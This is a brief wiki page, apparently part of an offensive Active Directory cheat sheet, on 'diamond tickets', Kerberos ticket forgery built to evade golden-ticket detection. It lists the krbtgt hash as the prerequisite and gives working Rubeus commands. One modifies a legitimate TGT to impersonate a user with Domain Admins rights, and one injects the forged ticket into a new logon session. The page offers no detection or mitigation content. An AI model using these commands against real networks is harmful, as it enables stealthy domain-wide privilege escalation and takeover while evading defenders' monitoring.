---
layout: default
title: Diamond Tickets
parent: Active Directory
nav_order: 1
permalink: /ad/diamond/
---

# Diamond Tickets
{: .no_toc }

## Table of contents
{: .no_toc .text-delta }

1. TOC
{:toc}

---

## Vulnerability

One weakness of [golden tickets](/ad/golden/) is that they can be detected. Indeed, since these TGT are forged offline, looking for TGS-REQ requests that have no corresponding AS-REQ would permit to spot golden tickets usage. Diamond tickets consists in modifying an existing legit TGT that was issued by a Domain Controller so it could not be detected.

## Prerequisites

* Having the password hash of `krbtgt` domain user.

## Exploit

```powershell
# Modify an existing TGT in the session to impersonate $username and put him in group 512 (corresponds to Domain Admins).
.\Rubeus.exe diamond /tgtdeleg /ticketuser:$username /ticketuserid:$rid /groups:512 /krbkey:$key /nowrap

# Inject the ticket in a dummy session.
.\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:$domain /username:$username /password:$whatever /ticket:$Base64EncodedTicket
```